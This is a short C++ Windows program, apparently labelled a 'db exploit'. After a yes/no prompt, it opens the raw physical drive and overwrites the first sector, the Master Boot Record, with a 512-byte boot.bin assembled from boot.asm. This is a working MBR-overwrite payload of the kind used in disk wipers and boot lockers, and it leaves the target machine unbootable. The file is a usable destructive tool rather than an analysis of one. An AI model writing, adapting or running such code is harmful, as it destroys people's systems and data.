#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <Windows.h>

int main() 
{
    // Confirmation
    std::string confirmation = "no";
    std::cout << "Type yes for db exploit, type no for going back.\n";
    std::cout << "Please type 'yes' or type 'no'\n>";
    std::cin >> confirmation;
    if (confirmation != "yes") { printf("Exiting program..."); return -1; }

    // Overwrite
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }

    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) { printf("Error opening a handle to boot.bin"); return -1; }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) { printf("Error opening a handle to boot.bin"); return -1; }

    byte* new_mbr = new byte[size];
    DWORD bytes_read;
    if(ReadFile(binary, new_mbr, size, &bytes_read, 0)) 
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            printf("First sector overritten successfuly!\n");
        }
    }else 
    {
        printf("Error reading boot.bin\n");
        printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
    }

    CloseHandle(binary);
    CloseHandle(drive);
    std::getchar();
    return 0;
}
